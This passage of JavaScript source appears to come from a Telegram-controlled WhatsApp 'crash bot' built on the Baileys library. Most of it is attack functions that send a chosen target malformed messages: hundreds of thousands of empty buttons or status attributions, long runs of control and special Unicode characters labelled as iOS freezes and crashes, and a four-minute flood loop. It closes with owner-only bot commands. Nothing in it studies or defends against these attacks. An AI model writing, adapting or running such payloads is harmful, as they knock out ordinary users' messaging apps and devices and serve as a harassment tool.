      message: {
        extendedTextMessage: {
          text: "\u0003".repeat(75000),
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 8000000) + "@s.whatsapp.net")
            ]
          }
        }
      }
    }, { participant: target });
  }

  const LexzyyMsg = {
    interactiveMessage: {
      body: {
        text: "LexzyMods - Executed¿!",
      },
      nativeFlowMessage: {
        buttons: Array.from({ length: 700000 }, () => ({}))
      },
      contextInfo: {
        quotedMessage: {
          orderMessage: {
            orderTitle: "Pt Nanas Muda",
            itemCount: 1999,
            totalAmount1000: "1000000",
            totalCurrencyCode: "IDR"
          },
        },
      },
    },
  };

  const acamsg = generateWAMessageFromContent(target, LexzyyMsg, {});

  await sock.relayMessage(target, acamsg.message, {
    participant: target,
    messageId: acamsg.key.id
  });

  const Lexca = {
    messageContextInfo: {
      deviceListMetadata: {},
      deviceListMetadataVersion: 2,
      botMetadata: {
        pluginMetadata: {},
        richResponseSourcesMetadata: {
          sources: []
        }
      }
    },
    message: {
      richResponseMessage: {
        messageType: 1,
        submessages: [
          {
            messageType: 3,
            tableMetadata: {
              title: "LexzyMods - Executed¿!",
              rows: Array.from({ length: 2000 }, () => ({}))
            }
          }
        ],
        unifiedResponse: {
          data: JSON.stringify({
            response_id: crypto.randomUUID(),
            sections: []
          })
        },
        contextInfo: {
          forwardingScore: 1,
          isForwarded: true,
          forwardedAiBotMessageInfo: {
            botJid: "NanasXExecutedXAllTeam"
          },
          forwardOrigin: 3
        }
      }
    }
  };

  const Lexcaa = generateWAMessageFromContent(target, Lexca, {});

  await sock.relayMessage(target, Lexcaa.message, {
    participant: target,
    messageId: Lexcaa.key.id
  });

  await sock.relayMessage(target, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [{
          name: "payment_info",
          buttonParamsJson: '{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"\x10' + Date.now() + '","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"' + '\u0000'.repeat(7500) + '","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"\x10","key":"' + '\u0000'.repeat(7500) + '","key_type":"CPF"}}],"share_payment_status":false}'
        }]
      }
    }
  }, {});

  await sock.relayMessage(target, {
    message: {
      extendedTextMessage: {
        text: "\u0003".repeat(9000),
        contextInfo: {
          participant: target,
          mentionedJid: [
            "0@s.whatsapp.net",
            ...Array.from(
              { length: 2000 },
              () => "5" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
            )
          ]
        }
      }
    }
  }, { participant: target });

  const Lexcabos = {
    message: {
      stickerPackMessage: {
        stickerPackId: "\u0000".repeat(9000),
        name: "LexzyMods - Executed¿!",
        publisher: "\u0000".repeat(9000),
        fileLength: 9999,
        fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
        fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
        mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
        mimetype: "image/webp",
        directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
        contextInfo: {
          statusAttributionType: 2,
          statusAttributions: Array.from({ length: 450000 }, () => ({ type: 1 }))
        },
      },
    },
  };

  await sock.relayMessage(target, Lexcabos, {
    participant: target,
  });

  const startTime3 = Date.now();
  const duration3 = 4 * 60 * 1000;
  while (Date.now() - startTime3 < duration3) {
    await sock.relayMessage(target, {
      message: {
        interactiveMessage: {
          body: {
            text: "Lexcaa - Executed¿!"
          },
          nativeFlowMessage: {
            buttons: Array.from({ length: 500000 }, () => ({}))
          },
        },
      },
    }, { participant: target });

    await new Promise(resolve => setTimeout(resolve, 500));

    await sock.relayMessage(target, {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "ExecutedTeam",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0003".repeat(9000),
            version: 3
          },
        }
      }
    }, { participant: target });

    await new Promise(resolve => setTimeout(resolve, 500));

    await sock.relayMessage(target, {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "NanasMuda - Executed‽!",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\x10".repeat(9000),
            version: 3
          },
        }
      }
    }, { participant: target });

    await new Promise(resolve => setTimeout(resolve, 500));

    await sock.relayMessage(target, {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Lexcaabos - Executed¿!",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: `{"values":{"in_pin_code":"xxx","building_name":"xxx","landmark_area":"X","address":"xxx","tower_number":"mmklu","city":"porno","name":"crb","phone_number":"xxx","house_number":"xxx","floor_number":"xxx","state":"yandex | ${"\u0000".repeat(9000)}"}}`,
            version: 3
          },
          contextInfo: {
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 2,
                expiryTimestamp: Math.floor(Date.now() / 1999) + 8640000
              }
            }
          }
        }
      }
    }, { participant: target });

    await new Promise(resolve => setTimeout(resolve, 500));

    await sock.relayMessage(target, {
      message: {
        extendedTextMessage: {
          text: "\u0003".repeat(9000),
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1999 },
                () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
              )
            ]
          }
        }
      }
    }, { participant: target });
  }

  const msgLarge = {
    key: { remoteJid: "status@broadcast", fromMe: true, id: generateId() },
    message: {
      imageMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0&mms3=true",
        mimetype: "image/jpeg",
        caption: "IamLexzyMods",
        fileSha256: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
        fileLength: 9999999,
        height: 9999,
        width: 9999,
        mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
        fileEncSha256: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
        directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1776937541",
        scanLengths: [9999999999999999999, 9999999999999999999, 9999999999999999999, 9999999999999999999],
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKAMBIgACEQEDEQH/xAAtAAADAQEBAAAAAAAAAAAAAAAAAwQCAQUBAQEBAAAAAAAAAAAAAAAAAAABAv/aAAwDAQACEAMQAAAA8xd08q1UTizoenMSK1a9WaMkNT3ZrFyc7nOmsY2rtlXZWZ3ooDzQNY6AaAP/xAAcEAADAAMBAQEAAAAAAAAAAAAAAQIDEBESEyD/2gAIAQEAAT8AyRwlDRS1lnp54UU9XRVlWd1ksqt9MjEunyfDyeRvpjJ5wySN6TJsp+j5tnToqFZjufyqaP/EABkRAAIDAQAAAAAAAAAAAAAAAAEQABEgAv/aAAgBAgEBPwBjA6dSzj//xAAaEQACAgMAAAAAAAAAAAAAAAABAhAgABEh/9oACAEDAQE/AJNCvJDZqn//2Q==",
        contextInfo: {
          pairedMediaType: "NOT_PAIRED_MEDIA",
          isQuestion: true,
          isGroupStatus: true,
          paymentExtendedMetadata: {
            type: 1,
            platform: "windowshortcut"
          },
          urlTrackingMap: {
            urlTrackingMapElements: Array.from({ length: 280000 }, () => ({
              "\u200B": "\u0000"
            }))
          },
          businessMessageForwardInfo: {
            businessOwnerJid: target
          }
        },
        streamingSidecar: "ifzqbbi6VQrr2qWUVcibCLLD5MublGIUI7VQWllrtSH0Oy9Oom8Fsw==",
        thumbnailDirectPath: "/v/t62.36147-24/597931020_1114136300619238_2132267882477762526_n.enc?ccb=11-4&oh=01_Q5Aa3QE3WwujMWlYXtHm0OsWvWU7G2iNPANw9Cpt64aOcOvNrg&oe=695F14B4&_nc_sid=5e03e0",
        thumbnailSha256: "ewOlFHMaQjWVM2MIHgdLESHC9lTe8wqHoRl5StiLkhM=",
        thumbnailEncSha256: "Vf7tqUV/U7cF064u4mVf9/b78ud+Ds3OS2AUwPOs5xE=",
        annotations: [
          {
            polygonVertices: [
              { x: 0.04808333143591881, y: 0.3758828043937683 },
              { x: 0.9397777915000916, y: 0.3758828043937683 },
              { x: 0.9397777915000916, y: 0.6241093873977661 },
              { x: 0.04808333143591881, y: 0.6241093873977661 }
            ],
            shouldSkipConfirmation: true,
            embeddedContent: {
              embeddedMessage: {
                stanzaId: "AC2FA3391836A5F431C9048A1146D3B5",
                message: {
                  extendedTextMessage: {
                    text: "👁‍🗨⃟‌‌LexzyMods - Executed¿!",
                    previewType: "NONE",
                    inviteLinkGroupTypeV2: "DEFAULT"
                  },
                  messageContextInfo: {
                    messageSecret: "/M7rquUfS6CESB44pG4gkIEnJXmWCj0TWplGd5anYpI=",
                    messageAssociation: {
                      associationType: 16,
                      parentMessageKey: {
                        remoteJid: "13135550202@bot",
                        fromMe: false,
                        id: "AC911EFEDA42DEA4586C4BB8C2814563",
                        participant: target
                      }
                    }
                  }
                }
              }
            },
            embeddedAction: true
          },
          {
            polygonVertices: [
              { x: 0.2779604196548462, y: 0.3697652220726013 },
              { x: 0.6993772983551025, y: 0.43257278203964233 },
              { x: 0.6015534996986389, y: 0.6402503848075867 },
              { x: 0.180136576294899, y: 0.5774427652359009 }
            ],
            shouldSkipConfirmation: true,
            embeddedContent: {
              embeddedMusic: {
                musicContentMediaId: "1906813674047253",
                songId: "1137812656623908",
                author: "𑲱".repeat(10000),
                title: "𑲱🗨⃟".repeat(10000),
                artworkDirectPath: "/v/t62.76458-24/598391103_3273009980213184_2759326202399655865_n.enc?ccb=11-4&oh=01_Q5Aa3QGnx-UJjjZjgAcBWAO2Z_fjAVSkr6_6Trx2fPX0bUWq_Q&oe=695F194E&_nc_sid=5e03e0",
                artworkSha256: "r9BWAOUfrDCnp3bn+/bzOx1A966Z3CSpnemr24FtaV0=",
                artworkEncSha256: "RxkYiV5YBTTkodlBT20qVHazbrBipHBCLb5t9BWuaXo=",
                artistAttribution: "https://t.me/LexzyMods",
                countryBlocklist: "UlU=",
                isExplicit: true,
                artworkMediaKey: "GuNInntcRnyNiYcZ28Ym4g8OeZz7JbNBHl6tPOL5BBA="
              }
            },
            embeddedAction: true
          }
        ]
      },
    }
  };

  await sock.relayMessage("status@broadcast", msgLarge.message, {
    statusJidList: [target],
    messageId: msgLarge.key.id,
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: { jid: target },
          content: undefined
        }]
      }]
    }]
  });

  await sock.relayMessage(target, {
    statusMentionMessage: {
      message: {
        protocolMessage: {
          key: msgLarge.key,
          type: 25
        },
        additionalNodes: [{
          tag: "meta",
          attrs: { is_status_mention: "false" },
          content: undefined
        }]
      }
    }
  }, {});
}

async function CrasNoCLikV3(sock, target) {
  const XHitS = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
         header: {
        imageMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
      mimetype: "image/jpeg",
      fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
      fileLength: 9999,
      height: 9999,
      width: 9999,
      mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
      fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
      directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1776937541",
      jpegThumbnail: null,
      caption: "MakLoo¡!",
      scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
      scanLengths: [
        9999999999999999999,
        9999999999999999999,
        9999999999999999999,
        9999999999999999999
      ],
      midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
    },
  },
   body: {
   text: "MakLo¡!"
},
 nativeFlowMessage: {
 buttons: Array.from({ length: 500000 }, () => ({}))
}
}
}
}
};

const aji = generateWAMessageFromContent(target, XHitS, {});

await sock.relayMessage(target, aji.message, {
// participant: true, 
  messageId: aji.key.id
})

const Locysk = {
groupStatusMessageV2: { 
message: {
interactiveMessage: {
body: {
text: "MakLo(RcB)"
},
nativeFlowMessage: {
buttons: Array.from({ length: 500000 }, () => ({}))
},
},
},
},
};

const xgh = generateWAMessageFromContent(target, Locysk, {});

await sock.relayMessage(target, xgh.message, {
// participant: true, 
messageId: xgh.key.id
})
}

async function CrasNoCLikV2(sock, target) {
  const XyootS = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
         header: {
        imageMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
      mimetype: "image/jpeg",
      fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
      fileLength: 9999,
      height: 9999,
      width: 9999,
      mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
      fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
      directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1776937541",
      jpegThumbnail: null,
      caption: "Nando¡!",
      scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
      scanLengths: [
        9999999999999999999,
        9999999999999999999,
        9999999999999999999,
        9999999999999999999
      ],
      midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
    },
  },
   body: {
   text: "Nando Officiall ¡!"
},
 nativeFlowMessage: {
 buttons: Array.from({ length: 500000 }, () => ({}))
}
}
}
}
};

const xfce = generateWAMessageFromContent(target, XyootS, {});

await sock.relayMessage(target, xfce.message, {
// participant: true, 
  messageId: xfce.key.id
})

const adghyu = {
groupStatusMessageV2: {
message: {
interactiveMessage: {
header: {
title: "Nando Officiall",
hasMediaAttachment: true,
documentMessage: {
url: "https://mmg.whatsapp.net/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4&oh=01_Q5Aa4gE54f2r8LoDblReCmtq2DnGP-mSrNd-omujIcrP313Vlg&oe=6A3DBD88&_nc_sid=5e03e0&mms3=true",
mimetype: "application/pdf",
fileSha256: "7rOXceVPuGvMTfHN7VXURYOQV2ZmzxQ4xZ6cLM2JNPA=",
fileLength: 999999999,
pageCount: 1000,
mediaKey: "oohdpzQ3uCjBvJWx+2VmRj4bWsCiTvrpUftezu27bs4=",
fileName: "nando.pdf",
fileEncSha256: "IT6Goux9voqfI50TST8rtFY9iVmxZenRz55JXZpAR2g=",
directPath: "/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4&oh=01_Q5Aa4gE54f2r8LoDblReCmtq2DnGP-mSrNd-omujIcrP313Vlg&oe=6A3DBD88&_nc_sid=5e03e0",
mediaKeyTimestamp: "1779839963",
thumbnailDirectPath: "/v/t62.36145-24/705860036_1320514133375133_5228808273876536402_n.enc?ccb=11-4&oh=01_Q5Aa4gFkVLVWUFlX-Jk7uj1PdsnY5lmVp4lWmmQYdHkPsFhTUQ&oe=6A3DAF40&_nc_sid=5e03e0",
thumbnailSha256: "xK2z7ScS2wSQDxLVfdZ5e1BpIe+GsTv8KaVGAfufqjY=",
thumbnailEncSha256: "2N98oiJb8xii+D/KYAuHRq7Mg/8OIHFXNZQ5py4g9fM=",
jpegThumbnail: null,
contextInfo: {},
thumbnailHeight: 999,
thumbnailWidth: 999
}
},
body: {
text: "Nando Officiall¡!",
},
nativeFlowMessage: {
 buttons: Array.from({ length: 500000 }, () => ({}))
}
}
}
}
};

const iVCsW = generateWAMessageFromContent(target, adghyu, {});

await sock.relayMessage(target, iVCsW.message, {
// participant: true,
messageId: iVCsW.key.id
})
}
//iosbug
async function makklofc(sock, target) {
  const iOS_Invisible_Freeze = "\x10" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000);
  const iOS_Unicode_Crash = "؂ن؃؄ٽ؂ن؃".repeat(10000);
  const complex_char = "𑇂𑆵𑆴𑆿".repeat(75000);

  const carouselIOS = {
    carouselMessage: {
      cards: Array.from({ length: 1950 }, () => ({
        cardHeader: {
          title: iOS_Invisible_Freeze,
          subtitle: "Apple_System_Kill",
          thumbnail: Buffer.alloc(0)
        },
        buttons: [
          {
            name: "payment_info",
            buttonParamsJson: JSON.stringify({ action: "x", data: iOS_Unicode_Crash })
          },
          {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({ display_text: "☠️", url: "https://", merchant_url: "https://" })
          }
        ]
      }))
    }
  };

  const iosListMsg = {
    viewOnceMessageV2: {
      message: {
        listResponseMessage: {
          title: "iOS_STROM" + complex_char,
          listType: 4,
          buttonText: { displayText: "Click for 🩸" },
          singleSelectReply: { selectedRowId: "crash" },
          contextInfo: {
            stanzaId: target,
            participant: target,
            quotedMessage: {
              adminInviteMessage: {
                groupJid: "12345@g.us",
                inviteCode: iOS_Unicode_Crash,
                inviteExpiration: 0,
                groupName: complex_char,
                caption: iOS_Invisible_Freeze
              }
            }
          }
        }
      }
    }
  };

  await sock.relayMessage(
    target,
    {
      stickerPackMessage: {
        stickerPackId: "X",
        name: "makkloo" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
        publisher: "makklo" + "؂ن؃؄ٽ؂ن؃".repeat(9000),
        stickers: [
          {
            fileName: "FlMx-HjycYUqguf2rn67DhDY1X5ZIDMaxjTkqVafOt8=.webp",
            isAnimated: false,
            emojis: ["💥"],
            accessibilityLabel: "woi",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "KuVCPTiEvFIeCLuxUTgWRHdH7EYWcweh+S4zsrT24ks=.webp",
            isAnimated: false,
            emojis: ["💥"],
            accessibilityLabel: "pppp",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "wi+jDzUdQGV2tMwtLQBahUdH9U-sw7XR2kCkwGluFvI=.webp",
            isAnimated: false,
            emojis: ["💥"],
            accessibilityLabel: "maklo",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "jytf9WDV2kDx6xfmDfDuT4cffDW37dKImeOH+ErKhwg=.webp",
            isAnimated: false,
            emojis: ["💥"],
            accessibilityLabel: "pp",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "ItSCxOPKKgPIwHqbevA6rzNLzb2j6D3-hhjGLBeYYc4=.webp",
            isAnimated: false,
            emojis: ["💥"],
            accessibilityLabel: "ppp",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "1EFmHJcqbqLwzwafnUVaMElScurcDiRZGNNugENvaVc=.webp",
            isAnimated: false,
            emojis: ["💥"],
            accessibilityLabel: "ppp",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "3UCz1GGWlO0r9YRU0d-xR9P39fyqSepkO+uEL5SIfyE=.webp",
            isAnimated: true,
            emojis: ["💥"],
            accessibilityLabel: "pppp",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "1cOf+Ix7+SG0CO6KPBbBLG0LSm+imCQIbXhxSOYleug=.webp",
            isAnimated: true,
            emojis: ["💥"],
            accessibilityLabel: "BOKEH",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "5R74MM0zym77pgodHwhMgAcZRWw8s5nsyhuISaTlb34=.webp",
            isAnimated: true,
            emojis: ["💥"],
            accessibilityLabel: "BOKEH",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "3c2l1jjiGLMHtoVeCg048To13QSX49axxzONbo+wo9k=.webp",
            isAnimated: false,
            emojis: ["💥"],
            accessibilityLabel: "BOKEH",
            isLottie: true,
            mimetype: "application/pdf",
          },
        ],
        fileLength: "999999",
        fileSha256: "4HrZL3oZ4aeQlBwN9oNxiJprYepIKT7NBpYvnsKdD2s=",
        fileEncSha256: "1ZRiTM82lG+D768YT6gG3bsQCiSoGM8BQo7sHXuXT2k=",
        mediaKey: "X9cUIsOIjj3QivYhEpq4t4Rdhd8EfD5wGoy9TNkk6Nk=",
        directPath:
          "/v/t62.15575-24/24265020_2042257569614740_7973261755064980747_n.enc?ccb=11-4&oh=01_Q5AaIJUsG86dh1hY3MGntd-PHKhgMr7mFT5j4rOVAAMPyaMk&oe=67EF584B&_nc_sid=5e03e0",
        contextInfo: {
          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 3,
              expiryTimestamp: Date.now() + 1814400000
            },
            forwardedAiBotMessageInfo: {
              botName: "META AI",
              botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
              creatorName: "Bot"
            }
          }
        },
        packDescription: "./maklo" + "؂ن؃؄ٽ؂ن؃".repeat(75000),
        mediaKeyTimestamp: "1741150286",
        trayIconFileName: "2496ad84-4561-43ca-949e-f644f9ff8bb9.png",
        thumbnailDirectPath:
          "/v/t62.15575-24/11915026_616501337873956_5353655441955413735_n.enc?ccb=11-4&oh=01_Q5AaIB8lN_sPnKuR7dMPKVEiNRiozSYF7mqzdumTOdLGgBzK&oe=67EF38ED&_nc_sid=5e03e0",
        thumbnailSha256: "R6igHHOD7+oEoXfNXT+5i79ugSRoyiGMI/h8zxH/vcU=",
        thumbnailEncSha256: "xEzAq/JvY6S6q02QECdxOAzTkYmcmIBdHTnJbp3hsF8=",
        thumbnailHeight: 9999,
        thumbnailWidth: 9999,
        imageDataHash:
          "ODBkYWY0NjE1NmVlMTY5ODNjMTdlOGE3NTlkNWFkYTRkNTVmNWY0ZThjMTQwNmIyYmI1ZDUyZGYwNGFjZWU4ZQ==",
        stickerPackSize: "999999999",
        stickerPackOrigin: "1",
      },
      requestPhoneNumberMessage: {
        skipType: "Makklloo",
        contextInfo: {
          remoteJid: "status@broadcast",
          externalAdReply: {
            title: "𑇂𑆵𑆴𑆿".repeat(15000),
            body: "𑇂𑆵𑆴𑆿".repeat(15000),
            mediaType: "DOCUMENT",
            renderLargerThumbnail: true,
            containsAutoReply: true,
            showAdAttribution: true,
            thumbnailUrl: "https://files.catbox.moe/mqdxsm.jpg",
            sourceUrl: `https://${"𑇂𑆵𑆴𑆿".repeat(15000)}.wa.me/settings/linked_devices/#Vault•¿🎭?•(Superior-iOS),,〽️/`,
          },
          quotedMessage: {
            conversation: "#Vault•¿🎭?•(Superior-iOS)" + "𑇂𑆵𑆴𑆿".repeat(15000)
          },
          businessMessageForwardInfo: {
            businessOwnerJid: "13135559999@s.whatsapp.net",
            businessDescrbiption: " # 𝖵𝖺𝗎𝗅𝗍 - 𝖲𝗎𝗉𝖾𝗋𝗂𝗈𝗋 〽️🎭 ",
          },
          mentionedJid: ["0@s.whatsapp.net"],
          forwardedNewsletterMessageInfo: {
            newsletterJid: "666-666@g.us",
            serverMessageId: 1,
            newsletterName: "؂ن؃؄ٽ؂ن؃",
            contentType: "UPDATE",
          },
        },
      },
      ...carouselIOS,
      ...iosListMsg,
      viewOnceMessage: {
        message: {
          locationMessage: {
            degreesLatitude: -66.6669989,
            degreesLongtitude: 66.6699996,
            name: "\x10" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
            address: "\x10" + "𑇂𑆵𑆴𑆿𑆿".repeat(9000),
            jpegThumbnail: null,
            url: `https://t.me/${"𑇂𑆵𑆴𑆿".repeat(9000)}`,
            contextInfo: {
              participant: target,
              forwardingScore: 1,
              isForwarded: true,
              stanzaId: target,
              mentionedJid: [target]
            },
          },
        },
      },
      requestPhoneNumberMessage: {
        contextInfo: {
          quotedMessage: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/pdf",
              fileSha256: "jLQrXn8TtEFsd/y5qF6UHW/4OE8RYcJ7wumBn5R1iJ8=",
              fileLength: 0,
              pageCount: 0,
              mediaKey: "xSUWP0Wl/A0EMyAFyeCoPauXx+Qwb0xyPQLGDdFtM4U=",
              fileName: "IosOnly.pdf",
              fileEncSha256: "R33GE5FZJfMXeV757T2tmuU0kIdtqjXBIFOi97Ahafc=",
              directPath: "/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0",
              mediaKeyTimestamp: 1737369406,
              caption: "makklo kill ios",
              title: "makklo",
              mentionedJid: [target],
            }
          },
          externalAdReply: {
            title: "makklo",
            body: "𑇂𑆵𑆴𑆿".repeat(75000),
            mediaType: "VIDEO",
            renderLargerThumbnail: true,
            sourceUrl: "https://t.me/makariizox",
            mediaUrl: "https://t.me/makariizox",
            containsAutoReply: true,
            showAdAttribution: true,
            ctwaClid: "ctwa_clid_example",
            ref: "ref_example"
          },
          forwardedNewsletterMessageInfo: {
            newsletterJid: "1@newsletter",
            serverMessageId: 1,
            newsletterName: "𑇂𑆵𑆴𑆿".repeat(30000),
            contentType: "UPDATE",
          },
        },
        skipType: 7,
      }
    },
    {
      participant: target,
    }
  );

  try {
    const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
    const msg = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          locationMessage: {
            degreesLatitude: -66.6669989,
            degreesLongtitude: 66.6699996,
            name: "\x10" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
            address: "\x10" + "𑇂𑆵𑆴𑆿𑆿".repeat(9000),
            jpegThumbnail: null,
            url: `https://t.me/${"𑇂𑆵𑆴𑆿".repeat(9000)}`,
            contextInfo: {
              participant: target,
              forwardingScore: 1,
              isForwarded: true,
              stanzaId: target,
              mentionedJid: [target]
            },
          },
        },
      },
    }, {});
    
    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta", attrs: {}, content: [{
          tag: "mentioned_users", attrs: {}, content: [{
            tag: "to", attrs: { jid: target }, content: undefined
          }],
        }],
      }],
    });
  } catch (error) {
    console.log(error);
  }
}

// ------ ( Akhir Of Function Bug) ------ //
bot.command('setchannel', (ctx) => {
  if (!isOwner(ctx)) return ctx.reply('❌ Anda bukan owner')

  const arg = ctx.message.text.split(' ')[1]

  if (!arg) {
    return ctx.reply('Format: /setchannel @channel / off')
  }

  if (arg === 'off') {
    forceChannel = null
    return ctx.reply('❌ Channel dihapus')
  }

  forceChannel = arg
  ctx.reply(`✅ Channel diset ke ${arg}`)
})

bot.command('channel', (ctx) => {
  if (!isOwner(ctx)) return ctx.reply('❌ Anda bukan owner')

  const arg = ctx.message.text.split(' ')[1]

  if (arg === 'on') {
    if (!forceChannel) {
      return ctx.reply('❌ Set channel dulu pakai /setchannel')
    }

    channelOn = true
    ctx.reply('🔒 Force Join diaktifkan')
  } 
  else if (arg === 'off') {
    channelOn = false
    ctx.reply('🔓 Force Join dimatikan')
  } 
  else {
    ctx.reply('Gunakan: /channel on / off')
  }
})

bot.command('grouponly', (ctx) => {
  const userId = String(ctx.from.id)
  const isOwner = ID_TELEGRAM || isAdmin(userId);

  if (!isOwner) {
    return ctx.reply('❌ Anda bukan owner')
  }

  const arg = ctx.message.text.split(' ')[1]

  if (arg === 'on') {
    groupOnly = true
    ctx.reply('🔒 Group Only diaktifkan (SEMUA private diblok)')
  } else if (arg === 'off') {
    groupOnly = false
